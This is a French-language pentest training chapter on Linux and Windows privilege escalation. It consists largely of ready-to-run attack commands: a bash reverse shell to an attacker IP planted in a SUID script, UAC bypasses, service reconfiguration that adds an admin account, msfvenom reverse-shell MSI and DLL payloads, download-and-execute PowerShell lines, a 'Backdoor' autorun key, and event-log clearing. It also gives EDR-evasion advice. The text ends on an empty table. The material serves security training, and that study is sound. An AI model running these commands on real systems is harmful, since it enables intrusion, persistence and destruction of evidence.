# Escalade de Privilèges

## 1. Introduction

L'escalade de privilèges représente une phase critique dans la chaîne d'attaque moderne. Après avoir obtenu un accès initial à un système, l'attaquant cherche à élever ses privilèges pour atteindre le statut d'administrateur système (root/SYSTEM), lui permettant ainsi de contrôler entièrement la machine compromise. Cette étape est souvent le pont entre une simple intrusion et une compromission totale.

### Pourquoi l'escalade de privilèges est-elle cruciale ?

Du point de vue offensif, l'escalade de privilèges permet de :
- Accéder à des données sensibles protégées par des contrôles d'accès
- Installer des backdoors persistantes et des rootkits
- Désactiver les mécanismes de sécurité
- Établir une base solide pour le mouvement latéral au sein du réseau
- Exfiltrer des données privilégiées
- Manipuler les journaux système pour effacer les traces

Pour les professionnels de la cybersécurité, maîtriser les techniques d'escalade de privilèges est essentiel non seulement pour les tests d'intrusion, mais aussi pour comprendre comment renforcer les systèmes contre ces attaques. La certification OSCP exige une connaissance approfondie de ces techniques, tant sur les systèmes Linux que Windows.

### Perspective défensive : EDR et Sysmon

Les équipes de défense ont développé des contre-mesures sophistiquées pour détecter les tentatives d'escalade de privilèges :

**Les solutions EDR (Endpoint Detection and Response)** surveillent en temps réel les comportements suspects sur les systèmes :
- Détection des exécutions de binaires inhabituels avec privilèges élevés
- Surveillance des modifications de registre Windows sensibles
- Identification des manipulations de jetons d'accès
- Alerte sur les modifications de fichiers système critiques
- Détection des techniques de contournement d'UAC

**Sysmon (System Monitor)** de Microsoft offre une visibilité approfondie sur :
- La création de processus et leurs lignées
- Les chargements de pilotes et DLL
- Les connexions réseau
- Les modifications de l'heure de création des fichiers
- Les opérations de création de processus distants

En tant que pentesteur, comprendre ces mécanismes de défense est crucial pour adapter vos techniques d'escalade de privilèges et minimiser votre empreinte sur le système cible. L'OPSEC (Operational Security) devient alors un élément central de votre stratégie.

Dans ce chapitre, nous explorerons méthodiquement les techniques d'escalade de privilèges sur les systèmes Linux et Windows, en fournissant des approches pratiques, des outils essentiels et des conseils pour éviter la détection. Nous aborderons également des scénarios réels et des exercices pratiques pour consolider vos compétences.

Commençons par explorer les vecteurs d'escalade de privilèges dans l'environnement Linux, avant de nous plonger dans l'univers Windows.

## 2. Escalade de Privilèges Linux

L'escalade de privilèges sous Linux repose sur l'exploitation de configurations incorrectes, de vulnérabilités logicielles ou de faiblesses dans la gestion des permissions. Une approche méthodique est essentielle pour identifier et exploiter ces vecteurs efficacement.

### 2.1 Méthodologie d'énumération

L'énumération constitue la pierre angulaire de toute tentative d'escalade de privilèges réussie. Elle doit être systématique et exhaustive pour ne manquer aucune opportunité potentielle.

#### Informations système et utilisateur

Commencez par recueillir des informations fondamentales sur le système :

```bash
# Informations sur le système d'exploitation
uname -a
cat /etc/issue
cat /etc/*-release
cat /proc/version

# Informations sur l'utilisateur actuel
id
whoami
sudo -l
groups

# Autres utilisateurs du système
cat /etc/passwd | grep -v "nologin\|false"
ls -la /home/
```

Ces commandes révèlent la version du noyau (potentiellement vulnérable), la distribution Linux, vos privilèges actuels et les autres utilisateurs du système. La commande `sudo -l` est particulièrement précieuse, car elle affiche les commandes que vous pouvez exécuter avec des privilèges élevés sans mot de passe.

#### Processus et services

Les processus en cours d'exécution peuvent révéler des services vulnérables ou des tâches planifiées :

```bash
ps aux
ps -ef
top -n 1
pstree -a

# Processus exécutés par root
ps aux | grep "^root"
```

L'outil `pspy` est particulièrement utile pour surveiller les processus sans privilèges root :

```bash
# Téléchargement et exécution de pspy
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64
./pspy64 -pf -i 1000
```

Cet outil permet de détecter les processus exécutés périodiquement (comme les tâches cron) qui pourraient être exploitables.

#### Fichiers et permissions

Recherchez les fichiers avec des permissions spéciales :

```bash
# Fichiers SUID
find / -perm -u=s -type f 2>/dev/null

# Fichiers SGID
find / -perm -g=s -type f 2>/dev/null

# Fichiers world-writable
find / -perm -o=w -type f -not -path "/proc/*" 2>/dev/null

# Fichiers sans propriétaire
find / -nouser -o -nogroup 2>/dev/null
```

Les fichiers SUID/SGID sont particulièrement intéressants car ils s'exécutent avec les privilèges de leur propriétaire/groupe, potentiellement root.

#### Capabilities

Les capabilities Linux permettent d'attribuer des privilèges spécifiques à des binaires sans leur donner tous les droits root :

```bash
# Recherche de binaires avec capabilities
getcap -r / 2>/dev/null
```

Certaines capabilities comme `cap_setuid`, `cap_setgid` ou `cap_sys_admin` peuvent être exploitées pour obtenir des privilèges root.

### 2.2 Vecteurs d'escalade de privilèges

#### Exploitation des binaires SUID/SGID

Les binaires SUID/SGID s'exécutent avec les privilèges de leur propriétaire/groupe. Si un binaire appartenant à root possède le bit SUID, il peut être exploité pour exécuter des commandes en tant que root.

Exemple avec `find` :

```bash
# Si find a le bit SUID
find . -exec /bin/sh -p \; -quit
```

Le flag `-p` est crucial car il préserve les privilèges effectifs lors de l'exécution du shell.

Autres exemples courants :
- `nano` : ouvrir /etc/passwd et ajouter un utilisateur root
- `cp` : copier des fichiers sensibles ou remplacer des fichiers système
- `vim` : ouvrir un shell avec `:!sh`
- `python` : exécuter `import os; os.system('/bin/bash -p')`

#### Exploitation des capabilities

Certaines capabilities peuvent être exploitées directement :

```bash
# Si python a cap_setuid+ep
./python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Si perl a cap_setuid+ep
./perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

#### Exploitation de sudo

La configuration de sudo peut permettre l'exécution de certaines commandes avec des privilèges élevés :

```bash
# Vérifier les permissions sudo
sudo -l
```

Si vous pouvez exécuter certains programmes avec sudo, consultez GTFOBins (https://gtfobins.github.io/) pour trouver des méthodes d'exploitation.

Exemple avec `less` :

```bash
sudo less /etc/profile
# Puis dans less, tapez :
!sh
```

#### Exploitation des tâches cron

Les tâches cron s'exécutent souvent avec des privilèges élevés. Si un script exécuté par cron est modifiable, vous pouvez l'exploiter :

```bash
# Vérifier les tâches cron système
cat /etc/crontab
ls -la /etc/cron.*

# Vérifier si des scripts sont modifiables
find /etc/cron* -type f -writable 2>/dev/null
```

Si vous trouvez un script modifiable, vous pouvez y ajouter une reverse shell ou une commande pour créer un utilisateur privilégié.

#### Exploitation des fichiers de service faibles

Les fichiers de service systemd peuvent être vulnérables :

```bash
# Rechercher des fichiers de service modifiables
find /etc/systemd/system -type f -writable 2>/dev/null
find /lib/systemd/system -type f -writable 2>/dev/null
```

Si vous pouvez modifier un fichier de service, vous pouvez changer la commande exécutée au démarrage du service.

#### Exploitation des vulnérabilités du noyau

Les exploits de noyau sont puissants mais risqués. Voici quelques exemples notables :

1. **DirtyCow (CVE-2016-5195)** : Affecte les noyaux Linux 2.x à 4.8.3
   ```bash
   # Vérifier la version du noyau
   uname -a
   # Compiler et exécuter l'exploit
   gcc -pthread dirty.c -o dirty -lcrypt
   ./dirty password
   ```

2. **OverlayFS (CVE-2021-3493)** : Affecte Ubuntu 14.04 - 20.10
   ```bash
   gcc -o exploit exploit.c
   ./exploit
   ```

3. **Dirty Pipe (CVE-2022-0847)** : Affecte les noyaux Linux 5.8 à 5.16.11
   ```bash
   gcc -o dirtypipe dirtypipe.c
   ./dirtypipe
   ```

**⚖️ Rappel ROE (Rules of Engagement)** : Les exploits de noyau peuvent causer des instabilités système ou des crashs. Utilisez-les uniquement lorsque c'est explicitement autorisé dans le cadre de votre engagement, et idéalement en dernier recours.

#### Exploitation de NFS avec root_squash désactivé

Si un serveur NFS est configuré sans root_squash, il est possible d'exploiter cette configuration :

```bash
# Vérifier les partages NFS
showmount -e <IP_cible>

# Monter le partage
mkdir /tmp/nfs
mount -t nfs <IP_cible>:/partage /tmp/nfs

# Créer un binaire SUID
echo '#!/bin/bash' > /tmp/nfs/shell.sh
echo 'bash -i >& /dev/tcp/<IP_attaquant>/4444 0>&1' >> /tmp/nfs/shell.sh
chmod +xs /tmp/nfs/shell.sh
```

#### Docker breakout

Si vous êtes membre du groupe docker, vous pouvez obtenir des privilèges root :

```bash
# Vérifier l'appartenance au groupe docker
groups

# Si vous êtes dans le groupe docker
docker run -v /:/mnt -it alpine chroot /mnt sh
```

Cette commande monte le système de fichiers hôte dans le conteneur et vous donne un shell root.

### 2.3 Outils d'automatisation

Plusieurs outils automatisent le processus d'énumération et suggèrent des vecteurs d'escalade de privilèges :

#### LinPEAS

LinPEAS est un script complet qui recherche les chemins d'escalade de privilèges potentiels :

```bash
# Téléchargement et exécution de LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

LinPEAS effectue une analyse approfondie du système et met en évidence les vulnérabilités potentielles avec un code couleur.

#### LinEnum

LinEnum est un autre script d'énumération populaire :

```bash
# Téléchargement et exécution de LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

#### Linux Exploit Suggester

Cet outil identifie les exploits de noyau potentiels basés sur la version du système :

```bash
# Téléchargement et exécution de Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

### 2.4 Considérations OPSEC

Les activités d'escalade de privilèges laissent des traces dans les journaux système. Voici comment minimiser votre empreinte :

#### Journaux à surveiller

```bash
# Principaux fichiers de journaux
/var/log/auth.log    # Tentatives d'authentification
/var/log/syslog      # Messages système généraux
/var/log/kern.log    # Messages du noyau
/var/log/audit/      # Journaux d'audit (si auditd est installé)
```

#### Techniques pour réduire la détection

1. **Évitez les échecs répétés** : Les tentatives échouées génèrent des alertes.
2. **Limitez l'utilisation de sudo** : Chaque utilisation est enregistrée.
3. **Préférez les techniques passives** : L'énumération des fichiers et permissions laisse moins de traces que l'exécution d'exploits.
4. **Utilisez des chemins relatifs** : Évitez les chemins absolus qui peuvent être surveillés.
5. **Évitez les outils bruyants** : Les scripts d'énumération automatisés génèrent beaucoup de bruit.

#### Nettoyage

```bash
# Effacer l'historique bash
history -c
rm ~/.bash_history

# Supprimer les fichiers temporaires
rm /tmp/linpeas.txt
rm /tmp/exploit
```

Cependant, notez que la suppression des journaux système est généralement déconseillée car :
- Elle peut déclencher des alertes
- Elle est souvent détectée par les solutions SIEM
- Elle peut violer les règles d'engagement

### 2.5 Exemple pratique : Escalade via SUID

Supposons que nous ayons découvert que le binaire `python` a le bit SUID :

```bash
find / -perm -u=s -type f 2>/dev/null | grep python
# Résultat : /usr/bin/python2.7
```

Nous pouvons exploiter ce binaire pour obtenir un shell root :

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Après exécution, nous obtenons un shell avec les privilèges root :

```bash
whoami
# Résultat : root
id
# Résultat : uid=0(root) gid=1000(user) groups=1000(user)
```

Cette technique fonctionne car le bit SUID permet à python de s'exécuter avec les privilèges du propriétaire (root), et nous utilisons la fonction `os.setuid(0)` pour définir notre UID réel à 0 (root) avant de lancer un shell.


## 3. Escalade de Privilèges Windows

L'environnement Windows présente une surface d'attaque différente de Linux, avec ses propres mécanismes de sécurité et vecteurs d'exploitation. La compréhension de l'architecture de sécurité Windows est fondamentale pour identifier et exploiter les chemins d'escalade de privilèges.

### 3.1 Méthodologie d'énumération

Une énumération systématique est la clé pour découvrir les vecteurs d'escalade de privilèges dans un environnement Windows.

#### Informations système et utilisateur

Commencez par recueillir des informations de base sur le système :

```powershell
# Informations sur le système
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Informations sur l'utilisateur actuel
whoami
whoami /all
net user %username%
```

La commande `whoami /all` est particulièrement utile car elle affiche les privilèges, les groupes et les droits de l'utilisateur actuel.

#### Utilisateurs et groupes

Énumérez les utilisateurs et les groupes du système :

```powershell
# Liste des utilisateurs
net user
net localgroup

# Informations sur les administrateurs
net localgroup Administrators

# Vérifier si l'utilisateur actuel peut exécuter des commandes en tant qu'administrateur
powershell -c "Get-LocalGroupMember -Group Administrators"
```

#### Privilèges et jetons

Vérifiez les privilèges de l'utilisateur actuel qui pourraient être exploités :

```powershell
# Vérifier les privilèges avec PowerShell
powershell -c "whoami /priv"
```

Recherchez particulièrement les privilèges suivants :
- SeImpersonatePrivilege
- SeAssignPrimaryTokenPrivilege
- SeTakeOwnershipPrivilege
- SeLoadDriverPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeDebugPrivilege

#### Services et applications

Énumérez les services en cours d'exécution et leurs configurations :

```powershell
# Liste des services
sc query
wmic service list brief

# Vérifier les permissions sur les services
powershell -c "Get-Service | Where-Object {$_.Status -eq 'Running'}"

# Vérifier les chemins des exécutables de service
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
```

#### Tâches planifiées

Les tâches planifiées peuvent révéler des opportunités d'escalade de privilèges :

```powershell
# Liste des tâches planifiées
schtasks /query /fo LIST /v
```

#### Registre Windows

Le registre Windows contient souvent des informations sensibles et des configurations exploitables :

```powershell
# Vérifier les clés AutoRun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Vérifier AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### 3.2 Vecteurs d'escalade de privilèges

#### Contournement d'UAC (User Account Control)

L'UAC est un mécanisme de sécurité qui demande une confirmation avant d'exécuter des actions privilégiées. Plusieurs techniques permettent de le contourner :

##### Technique Fodhelper

```powershell
# Créer une clé de registre malveillante
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd.exe /c powershell.exe" -Force

# Déclencher l'exécution
Start-Process "C:\Windows\System32\fodhelper.exe"
```

Cette technique exploite le fait que fodhelper.exe est un binaire qui s'exécute avec des privilèges élevés et recherche des clés de registre dans HKCU.

##### Technique Eventvwr

```powershell
# Créer une clé de registre malveillante
New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(Default)" -Value "cmd.exe /c powershell.exe" -Force

# Déclencher l'exécution
Start-Process "C:\Windows\System32\eventvwr.exe"
```

#### Usurpation de jeton (Token Impersonation)

L'usurpation de jeton exploite les privilèges SeImpersonatePrivilege ou SeAssignPrimaryTokenPrivilege pour obtenir un jeton SYSTEM.

##### Technique Incognito

```powershell
# Dans une session Meterpreter
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

##### Technique PrintSpoofer

```powershell
# Télécharger et exécuter PrintSpoofer
.\PrintSpoofer.exe -i -c cmd
```

PrintSpoofer exploite le service Spooler d'impression pour obtenir un shell SYSTEM.

##### Technique RoguePotato/JuicyPotato

```powershell
# Exécuter RoguePotato
.\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami > C:\Users\Public\whoami.txt" -l 9999
```

Ces outils exploitent les vulnérabilités NTLM et COM pour élever les privilèges.

#### Mauvaise configuration des services

Les services mal configurés sont une cible courante pour l'escalade de privilèges.

##### Chemins non cités (Unquoted Service Paths)

Si le chemin d'un service contient des espaces et n'est pas entre guillemets, Windows recherche l'exécutable dans plusieurs emplacements :

```powershell
# Rechercher des chemins de service non cités
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Exploiter un chemin non cité (exemple)
# Si le chemin est : C:\Program Files\Vulnerable Service\service.exe
# Créer un fichier malveillant à C:\Program.exe
copy C:\Windows\System32\cmd.exe "C:\Program.exe"
```

##### Permissions faibles sur les fichiers de service

```powershell
# Vérifier les permissions avec icacls
icacls "C:\Program Files\Vulnerable Service\service.exe"

# Si modifiable, remplacer par un fichier malveillant
copy /Y evil.exe "C:\Program Files\Vulnerable Service\service.exe"
```

##### ACL faibles sur les services

```powershell
# Vérifier les permissions sur un service
sc sdshow vulnerable_service

# Modifier la configuration d'un service
sc config vulnerable_service binpath= "cmd.exe /c net user hacker Password123! /add && net localgroup Administrators hacker /add"
sc start vulnerable_service
```

#### Exploitation du registre

##### AlwaysInstallElevated

Si cette politique est activée, les packages MSI s'installent avec des privilèges SYSTEM :

```powershell
# Vérifier si AlwaysInstallElevated est activé
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Créer un package MSI malveillant
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# Installer le package MSI
msiexec /quiet /qn /i evil.msi
```

##### Autorun

Les clés Autorun peuvent être exploitées si elles sont modifiables :

```powershell
# Vérifier les clés Autorun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Ajouter une clé malveillante
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
```

#### Détournement de DLL (DLL Hijacking)

Le détournement de DLL exploite la façon dont Windows recherche les DLL :

```powershell
# Identifier les DLL manquantes avec Process Monitor
# Créer une DLL malveillante
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o evil.dll

# Placer la DLL dans le répertoire de l'application ou dans le PATH
copy evil.dll C:\Vulnerable\Application\missing.dll
```

#### Exploits du noyau Windows

Les exploits de noyau peuvent être utilisés en dernier recours :

```powershell
# MS16-032 (Secondary Logon Handle)
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1'); Invoke-MS16032"
```

**⚖️ Rappel ROE** : Les exploits de noyau peuvent causer des instabilités système ou des crashs. Utilisez-les uniquement lorsque c'est explicitement autorisé dans le cadre de votre engagement.

### 3.3 Outils d'automatisation

Plusieurs outils automatisent le processus d'énumération et suggèrent des vecteurs d'escalade de privilèges :

#### WinPEAS

WinPEAS est un script complet qui recherche les chemins d'escalade de privilèges potentiels :

```powershell
# Téléchargement et exécution de WinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -O winpeas.exe
.\winpeas.exe
```

WinPEAS effectue une analyse approfondie du système et met en évidence les vulnérabilités potentielles avec un code couleur.

#### Seatbelt

Seatbelt est un outil de reconnaissance de sécurité Windows :

```powershell
# Exécution de Seatbelt
.\Seatbelt.exe -group=all
```

#### PowerUp

PowerUp est un script PowerShell qui recherche les vecteurs d'escalade de privilèges courants :

```powershell
# Exécution de PowerUp
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
```

#### AccessChk

AccessChk permet de vérifier les permissions sur les fichiers, les services et les clés de registre :

```powershell
# Vérifier les permissions sur les services
.\accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```

#### Windows Exploit Suggester

Cet outil identifie les exploits potentiels basés sur les mises à jour manquantes :

```powershell
# Sur la machine attaquante
# Exécuter systeminfo sur la cible et sauvegarder la sortie
python windows-exploit-suggester.py --database 2021-04-15-mssb.xls --systeminfo systeminfo.txt
```

### 3.4 Considérations OPSEC

Les activités d'escalade de privilèges laissent des traces dans les journaux Windows. Voici comment minimiser votre empreinte :

#### Journaux à surveiller

Windows enregistre les événements dans plusieurs journaux :

```powershell
# Principaux journaux Windows
Get-EventLog -List
```

Les journaux les plus pertinents sont :
- Security (4624: connexion, 4672: privilèges spéciaux)
- System (7045: nouveau service)
- Application

#### Techniques pour réduire la détection

1. **Évitez PowerShell si surveillé** : Utilisez des alternatives comme MSBuild ou installutil.
2. **Limitez les échecs d'authentification** : Ils génèrent des alertes.
3. **Préférez les techniques en mémoire** : Évitez d'écrire sur le disque si possible.
4. **Utilisez des outils légitimes** : Les outils natifs de Windows sont moins suspects.
5. **Évitez les connexions réseau inutiles** : Elles peuvent être détectées par les EDR.

#### Nettoyage

```powershell
# Effacer les journaux d'événements (nécessite des privilèges administratifs)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Effacer l'historique PowerShell
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Supprimer les fichiers temporaires
Remove-Item C:\Users\Public\*.exe
```

Cependant, notez que la suppression des journaux est généralement déconseillée car :
- Elle peut déclencher des alertes
- Elle est souvent détectée par les solutions SIEM
- Elle peut violer les règles d'engagement

### 3.5 Exemple pratique : Escalade via PrintSpoofer

Supposons que nous ayons obtenu un accès à un système Windows en tant qu'utilisateur avec le privilège SeImpersonatePrivilege :

```powershell
whoami /priv
# Résultat : SeImpersonatePrivilege Enabled
```

Nous pouvons exploiter ce privilège avec PrintSpoofer :

1. Télécharger PrintSpoofer sur la machine cible :
```powershell
# Sur la machine attaquante, héberger PrintSpoofer
python -m http.server 8080

# Sur la machine cible, télécharger PrintSpoofer
certutil -urlcache -f http://10.10.10.10:8080/PrintSpoofer.exe C:\Users\Public\ps.exe
```

2. Exécuter PrintSpoofer pour obtenir un shell SYSTEM :
```powershell
C:\Users\Public\ps.exe -i -c cmd
```

3. Vérifier les privilèges :
```powershell
whoami
# Résultat : NT AUTHORITY\SYSTEM
```

Cette technique fonctionne car le service Spooler d'impression s'exécute en tant que SYSTEM et peut être exploité par un utilisateur disposant du privilège SeImpersonatePrivilege pour créer un processus avec les privilèges SYSTEM.


## 4. Tableau comparatif des outils d'escalade de privilèges

Cette section présente un tableau exhaustif des outils d'escalade de privilèges pour Linux et Windows, détaillant leurs usages spécifiques ainsi que leurs atouts et limites.

### 4.1 Outils pour Linux

| Outil | Usage principal | Atouts | Limites |
|-------|----------------|--------|---------|
| **LinPEAS** | Énumération automatisée complète | • Détection exhaustive de vecteurs<br>• Code couleur pour priorisation<br>• Détection de configurations inhabituelles<br>• Mise à jour régulière | • Très bruyant (génère beaucoup de logs)<br>• Peut être détecté par les EDR<br>• Peut provoquer des crashs sur systèmes instables |
| **LinEnum** | Énumération ciblée du système | • Plus léger que LinPEAS<br>• Moins bruyant<br>• Options de personnalisation | • Moins exhaustif que LinPEAS<br>• Mises à jour moins fréquentes |
| **Linux Exploit Suggester** | Identification d'exploits de noyau | • Correspondance précise avec versions<br>• Suggestions d'exploits spécifiques<br>• Fonctionne hors ligne | • Ne vérifie pas les configurations<br>• Peut suggérer des exploits non applicables<br>• Nécessite des mises à jour manuelles |
| **pspy** | Surveillance des processus | • Fonctionne sans privilèges root<br>• Détecte les tâches cron cachées<br>• Surveille en temps réel | • Consommation CPU élevée<br>• Peut être détecté par monitoring<br>• Ne détecte pas les processus déjà en cours |
| **GTFOBins** | Référence d'exploitation de binaires | • Documentation exhaustive<br>• Exemples pratiques<br>• Mise à jour communautaire | • Nécessite un accès internet<br>• Requiert une analyse manuelle<br>• N'est pas un outil automatisé |
| **sudo-hunter** | Analyse des configurations sudo | • Détection précise des règles sudo<br>• Suggestions d'exploitation<br>• Léger | • Limité aux vulnérabilités sudo<br>• Nécessite des droits sudo -l |
| **SUID3NUM** | Énumération des binaires SUID | • Spécialisé et efficace<br>• Vérifie les versions vulnérables<br>• Suggestions d'exploitation | • Portée limitée (SUID uniquement)<br>• Peut manquer des contextes spécifiques |
| **Bashark** | Framework de post-exploitation | • Multiples fonctionnalités<br>• Interface conviviale<br>• Modules d'évasion | • Taille importante<br>• Peut être flaggé comme malveillant<br>• Complexité d'utilisation |
| **unix-privesc-check** | Audit de sécurité local | • Analyse approfondie<br>• Faible taux de faux positifs<br>• Format de rapport structuré | • Exécution lente<br>• Moins maintenu récemment |
| **BeRoot** | Analyse des vecteurs courants | • Multi-plateforme<br>• Code Python portable<br>• Analyse des misconfigurations | • Moins exhaustif que LinPEAS<br>• Détection limitée des exploits récents |
| **DirtyCow Exploit** | Exploitation de CVE-2016-5195 | • Fiabilité élevée<br>• Fonctionne sur de nombreuses versions<br>• Documentation détaillée | • Risque de crash système<br>• Détecté par la plupart des EDR<br>• Nécessite compilation |
| **Overlayfs Exploit** | Exploitation de CVE-2021-3493 | • Efficace sur Ubuntu 14.04-20.10<br>• Code source disponible<br>• Exploitation stable | • Spécifique à certaines versions<br>• Nécessite compilation<br>• Détectable |
| **Dirty Pipe Exploit** | Exploitation de CVE-2022-0847 | • Affecte les noyaux récents<br>• Exploitation fiable<br>• Peu de dépendances | • Limité aux noyaux 5.8-5.16.11<br>• Risque d'instabilité<br>• Traces dans les logs |

### 4.2 Outils pour Windows

| Outil | Usage principal | Atouts | Limites |
|-------|----------------|--------|---------|
| **WinPEAS** | Énumération automatisée complète | • Détection exhaustive<br>• Code couleur pour priorisation<br>• Versions exe et bat disponibles<br>• Détection de misconfigurations | • Très bruyant (génère beaucoup de logs)<br>• Flaggé par la plupart des AV<br>• Taille importante (version exe) |
| **PowerUp** | Énumération via PowerShell | • Exécution en mémoire possible<br>• Intégration avec frameworks<br>• Modules de correction automatique | • Nécessite PowerShell<br>• Détecté par AMSI<br>• Nécessite contournement de politique d'exécution |
| **Seatbelt** | Audit de sécurité système | • Énumération ciblée<br>• Faible taux de faux positifs<br>• Personnalisation des modules | • Flaggé par AV<br>• Nécessite compilation .NET<br>• Documentation limitée |
| **SharpUp** | Version C# de PowerUp | • Évite PowerShell<br>• Exécution en mémoire<br>• Compatible avec Cobalt Strike | • Moins de fonctionnalités que PowerUp<br>• Nécessite .NET Framework<br>• Détectable par EDR avancés |
| **AccessChk** | Vérification des permissions | • Outil Microsoft légitime<br>• Analyse précise des ACL<br>• Faible détection | • Interface en ligne de commande<br>• Nécessite des paramètres spécifiques<br>• Analyse manuelle des résultats |
| **Windows Exploit Suggester** | Identification d'exploits | • Analyse basée sur KB manquants<br>• Base de données mise à jour<br>• Fonctionne hors ligne | • Nécessite Python sur machine attaquante<br>• Peut suggérer des exploits non applicables<br>• Analyse manuelle requise |
| **JAWS** | Script d'énumération PowerShell | • Léger et portable<br>• Génère un fichier HTML<br>• Facile à utiliser | • Moins exhaustif que WinPEAS<br>• Détectable via PowerShell logging<br>• Mises à jour peu fréquentes |
| **Watson** | Détection de vulnérabilités locales | • Précision élevée<br>• Vérification des correctifs installés<br>• Faible taux de faux positifs | • Nécessite compilation<br>• Base de données limitée<br>• Spécifique à certaines versions Windows |
| **PrintSpoofer** | Exploitation du service Spooler | • Fiabilité élevée<br>• Fonctionne sur Windows 10/Server 2019<br>• Code source disponible | • Nécessite SeImpersonatePrivilege<br>• Détectable par EDR<br>• Nécessite accès au service Spooler |
| **RoguePotato** | Usurpation de jeton NTLM | • Exploitation avancée<br>• Contourne les correctifs de RottenPotato<br>• Fonctionne sur systèmes récents | • Configuration complexe<br>• Nécessite redirection NTLM<br>• Détectable par surveillance réseau |
| **Juicy Potato** | Élévation via COM | • Efficace sur Windows 7-10<br>• Documentation détaillée<br>• Nombreux CLSID disponibles | • Ne fonctionne pas sur Windows Server 2019+<br>• Nécessite SeImpersonatePrivilege<br>• Détectable |
| **Mimikatz** | Vol d'identifiants et manipulation de jetons | • Fonctionnalités multiples<br>• Modules d'exploitation avancés<br>• Développement actif | • Détecté par tous les AV<br>• Nécessite privilèges élevés pour certaines fonctions<br>• Traces évidentes |
| **Incognito** | Usurpation de jetons | • Intégration avec Metasploit<br>• Interface simple<br>• Efficace pour le mouvement latéral | • Nécessite Meterpreter<br>• Détectable<br>• Limité aux jetons disponibles |
| **PowerSploit** | Framework PowerShell | • Suite complète d'outils<br>• Modules variés<br>• Documentation détaillée | • Flaggé par AV/EDR<br>• Nécessite PowerShell<br>• Traces dans les logs PowerShell |
| **BeRoot** | Analyse multi-plateforme | • Fonctionne sur Windows et Linux<br>• Code Python portable<br>• Détection de misconfigurations | • Moins exhaustif que WinPEAS<br>• Nécessite Python<br>• Analyse manuelle des résultats |
| **UAC-Duck** | Contournement d'UAC | • Multiples techniques<br>• Mise à jour régulière<br>• Documentation des méthodes | • Efficacité variable selon versions<br>• Certaines techniques obsolètes<br>• Détectable |
| **SharpElevate** | Élévation via tâches planifiées | • Exécution en mémoire<br>• Évite PowerShell<br>• Peu détecté | • Nécessite certains privilèges<br>• Laisse des traces dans les tâches planifiées<br>• Documentation limitée |

### 4.3 Considérations pour le choix des outils

Lors de la sélection d'outils pour l'escalade de privilèges, plusieurs facteurs doivent être pris en compte :

1. **Environnement cible** : La version du système d'exploitation, les correctifs installés et les solutions de sécurité déployées influencent l'efficacité des outils.

2. **Empreinte OPSEC** : Certains outils génèrent beaucoup de bruit et sont facilement détectables, tandis que d'autres sont plus discrets.

3. **Stabilité du système** : Les exploits de noyau peuvent causer des instabilités ou des crashs. Dans un environnement de production, privilégiez les méthodes plus stables.

4. **Persistance des modifications** : Certains outils laissent des traces permanentes sur le système, ce qui peut compliquer le nettoyage après un test d'intrusion.

5. **Compétences requises** : Certains outils nécessitent une expertise technique avancée pour être utilisés efficacement et en toute sécurité.

La stratégie optimale consiste souvent à commencer par des outils d'énumération non invasifs, puis à progresser vers des techniques plus spécifiques en fonction des vulnérabilités identifiées.

## 5. Quick Ops (< 1 h)

Cette section est conçue pour les situations où le temps est limité et où vous devez obtenir rapidement des privilèges élevés. Elle fournit des commandes essentielles, une checklist d'actions prioritaires et un scénario express pour Linux et Windows.

### 5.1 Tableau des commandes clés

| Environnement | Commande | Description | Utilisation rapide |
|---------------|----------|-------------|-------------------|
